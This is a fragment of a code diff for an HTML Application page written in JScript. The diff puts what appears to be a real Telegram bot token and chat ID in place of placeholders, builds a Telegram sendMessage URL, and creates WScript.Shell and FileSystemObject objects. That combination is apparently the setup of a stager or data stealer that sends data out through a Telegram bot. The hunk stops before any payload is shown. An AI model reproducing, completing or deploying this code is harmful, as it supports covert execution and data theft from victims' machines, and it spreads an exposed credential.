@@ -2,8 +2,8 @@
 <html>
 <head>
 <script language="JScript">
-var TOKEN = "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11";
-var CHAT = "123456789";
+var TOKEN = "8814328356:AAFwdZd_Mlj9kZOOUVw7ERPEnRB238jqzTE";
+var CHAT = "8692286004";
 var API = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
 var wsh = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
